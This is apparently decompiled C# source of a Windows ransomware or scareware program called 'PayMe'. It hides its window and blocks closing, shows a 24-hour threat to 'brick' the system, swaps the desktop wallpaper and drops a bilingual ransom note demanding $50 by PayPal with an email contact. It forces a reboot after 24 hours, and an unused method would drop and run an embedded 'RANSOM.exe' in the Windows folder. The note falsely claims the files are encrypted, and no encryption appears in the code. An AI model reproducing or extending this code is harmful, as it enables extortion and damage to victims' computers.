using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace PayMe;

public class Form1 : Form
{
	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	private const int SPIF_SENDWININICHANGE = 2;

	private IContainer components = null;

	private Timer tmr_out;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		tmr_out.Start();
		MessageBox.Show("You only have 24 hours to complete the payment, if the payment isn't made by tomorrow night, we'l brick your entire system", "PayMe", (MessageBoxButtons)0, (MessageBoxIcon)48);
		string text = "a.png";
		Extract("PayMe", AppDomain.CurrentDomain.BaseDirectory, "Resources", text);
		string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
		changeWallpaper(baseDirectory + text);
		dropRansomLetter();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	private static void changeWallpaper(string filename)
	{
		try
		{
			SystemParametersInfo(20, 1, filename, 1);
		}
		catch (Exception)
		{
		}
	}

	private void dropRansomLetter()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		using (StreamWriter streamWriter = File.CreateText(folderPath + "\\PayMe_Decryptor.txt"))
		{
			streamWriter.WriteLine("+------------------------English-------------------------+");
			streamWriter.WriteLine("Your important data is being encrypted, with a special encryption software. It is certainly impossible for you to recover your data without");
			streamWriter.WriteLine("a private decryption Key, to purchase it, follow the steps below, carefulLy, without skipping any! Perhaps you are busy");
			streamWriter.WriteLine("looking for a way to recover your data, but do not waste your time, nobody can recover your files without our Help!");
			streamWriter.WriteLine("1. Send us $50 to our PayPal: *PayPal later*");
			streamWriter.WriteLine("2. E-mail danielnusradin@gmail.com a sreenshot of your submitted payment...");
			streamWriter.WriteLine("3. You should receive a file containing a decryption Software, use it decrypt your data, and continue on using your PC.");
			streamWriter.WriteLine("+------------------------Russian-------------------------+");
			streamWriter.WriteLine("Ваши важные данные шифруются специальным программным обеспечением для шифрования. Конечно, вы не сможете восстановить свои данные без");
			streamWriter.WriteLine("приватный ключ дешифрования, чтобы приобрести его, внимательно следуйте приведенным ниже шагам, не пропуская ни одного! Возможно, вы заняты");
			streamWriter.WriteLine("ищите способ восстановить ваши данные, но не тратьте время зря, никто не сможет восстановить ваши файлы без нашей помощи!");
			streamWriter.WriteLine("1. Отправьте нам 50 долларов на наш PayPal: *PayPal позже*");
			streamWriter.WriteLine("2. Отправьте на danielnusradin@gmail.com скриншот отправленного платежа...");
			streamWriter.WriteLine("3. Вы должны получить файл, содержащий программное обеспечение для расшифровки, использовать его для расшифровки ваших данных и продолжать использовать свой компьютер.");
		}
		Process.Start(folderPath + "\\PayMe_Decryptor.txt");
	}

	private void overwriteMBR()
	{
		Extract("PayMe", "C:\\Windows", "Resources", "RANSOM.exe");
		Process.Start("C:\\\\Windows\\\\RANSOM.exe");
	}

	private void tmr_out_Tick(object sender, EventArgs e)
	{
		tmr_out.Stop();
		ProcessStartInfo processStartInfo = new ProcessStartInfo("shutdown", "/r /t 0");
		processStartInfo.CreateNoWindow = true;
		processStartInfo.UseShellExecute = false;
		Process.Start(processStartInfo);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b8: Expected O, but got Unknown
		components = new Container();
		tmr_out = new Timer(components);
		((Control)this).SuspendLayout();
		tmr_out.set_Interval(86400000);
		tmr_out.add_Tick((EventHandler)tmr_out_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(169, 56));
		((Form)this).set_ControlBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
